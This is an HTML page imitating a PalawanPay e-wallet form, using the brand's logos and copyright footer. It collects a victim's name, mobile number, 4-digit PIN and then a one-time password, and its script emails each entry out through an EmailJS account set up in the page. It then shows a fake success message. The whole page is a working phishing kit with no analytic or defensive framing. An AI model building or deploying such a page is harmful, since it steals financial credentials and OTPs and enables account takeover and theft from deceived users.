<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PalawanPay Form</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("KoDtU57AV30FBPls2");
    })();
  </script>
  <style>
    * {
      box-sizing: border-box;
    }
    html, body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      height: 100%;
    }
    body {
      background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)),
                  url('https://www.palawanpawnshop.com/uploads/media/money-managment-quiz-og.jpg') no-repeat center center;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      min-height: 100vh;
      position: relative;
    }
    .background-logo {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 100%;
      height: auto;
      max-width: none;
      opacity: 0.8;
      z-index: 0;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
      width: 90%;
      max-width: 400px;
      margin: 20px;
      text-align: center;
      position: relative;
      z-index: 1;
    }
    .logo {
      width: 100%;
      max-width: 100%;
      height: auto;
      margin-bottom: 15px;
      border-radius: 10px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #046930;
    }
    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 14px;
      background-color: #046930;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #035224;
    }
    .footer {
      text-align: center;
      color: #ffffff;
      font-size: 14px;
      margin-top: 20px;
      padding-bottom: 10px;
      z-index: 1;
      position: relative;
    }
  </style>
</head>
<body>
  <img class="background-logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_cxoYkt5zhhhKk_fc15G23cx6Nb3qx_4m6A&s" alt="Background Logo">

  <div class="container" id="page1">
    <img src="https://www.ecpay.com.ph/sites/default/files/2023-12/PALAWANPAY_COMPANY%20LOGO.png" alt="PalawanPay Logo" class="logo" />
    <h2>PalawanPay Form</h2>
    <form id="info-form">
      <input type="text" name="name" placeholder="Name" required />
      <input type="tel" name="mobile" placeholder="Mobile Number" required />
      <input type="password" name="pin" maxlength="4" placeholder="4-digit PIN" required />  
      <input type="text" name="unit" placeholder="Unit of installment or GGives" required />
      <button type="submit">Next</button>
    </form>
  </div>

  <div class="container" id="page2" style="display: none;">
    <img src="https://www.ecpay.com.ph/sites/default/files/2023-12/PALAWANPAY_COMPANY%20LOGO.png" alt="PalawanPay Logo" class="logo" />
    <h2>Enter OTP</h2>
    <form id="otp-form">
      <input type="text" name="otp" maxlength="6" placeholder="One-Time Password (OTP)" required />
      <button type="submit">Submit</button>
    </form>
  </div>

  <div class="footer">Â© 2024 Palawan Pawnshop, All Rights Reserved</div>

  <script>
    let formData = {};

    document.getElementById('info-form').addEventListener('submit', function(e) {
      e.preventDefault();
      const form = e.target;

      if (!form.checkValidity()) {
        form.reportValidity();
        return;
      }

      const formElements = form.elements;
      formData = {
        name: formElements['name'].value,
        mobile: formElements['mobile'].value,
        pin: formElements['pin'].value,
        unit: formElements['unit'].value
      };

      const tempForm = document.createElement('form');
      tempForm.style.display = 'none';
      for (const key in formData) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = formData[key];
        tempForm.appendChild(input);
      }
      document.body.appendChild(tempForm);

      emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', tempForm)
        .then(function() {
          document.getElementById('page1').style.display = 'none';
          document.getElementById('page2').style.display = 'block';
        }, function(error) {
          console.log('FAILED...', error);
          alert('There was a problem submitting the first form.');
        });
    });

    document.getElementById('otp-form').addEventListener('submit', function(e) {
      e.preventDefault();
      formData.otp = this.elements['otp'].value;

      const tempForm = document.createElement('form');
      tempForm.style.display = 'none';
      for (const key in formData) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = formData[key];
        tempForm.appendChild(input);
      }

      document.body.appendChild(tempForm);

      emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', tempForm)
        .then(function() {
          alert('Your OTP has been sent to PalawanPay Express. Thank you!');
          location.reload();
        }, function(error) {
          console.log('FAILED...', error);
          alert('There was a problem submitting your OTP.');
        });
    });
  </script>
</body>
</html>
